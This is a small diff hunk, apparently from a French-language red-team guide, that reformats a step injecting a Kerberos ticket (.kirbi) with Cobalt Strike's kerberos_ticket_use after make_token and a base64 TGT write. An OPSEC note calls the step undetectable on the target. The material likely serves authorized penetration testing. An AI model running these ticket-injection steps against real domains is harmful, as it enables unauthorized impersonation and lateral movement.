@@ -178,11 +178,11 @@ make_token CONTOSO\PARTNER$ FakePassword
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\partner.kirbi", [Convert]::FromBase64String("[BASE64_TGT]"))
 ```
 
-    Puis injecter le ticket avec la commande native Cobalt Strike :
+Puis injecter le ticket avec la commande native Cobalt Strike :
 
-    ```Beacon-nocolor
-    kerberos_ticket_use C:\Users\Attacker\Desktop\partner.kirbi
-    ```
+```Beacon-nocolor
+kerberos_ticket_use C:\Users\Attacker\Desktop\partner.kirbi
+```
 
     > **OPSEC-🟢SAFE** — Injection via l’API Windows Kerberos, sans nouveau processus ni écriture disque sur la cible. Le `.kirbi` reste sur l’Attacker Desktop.
 
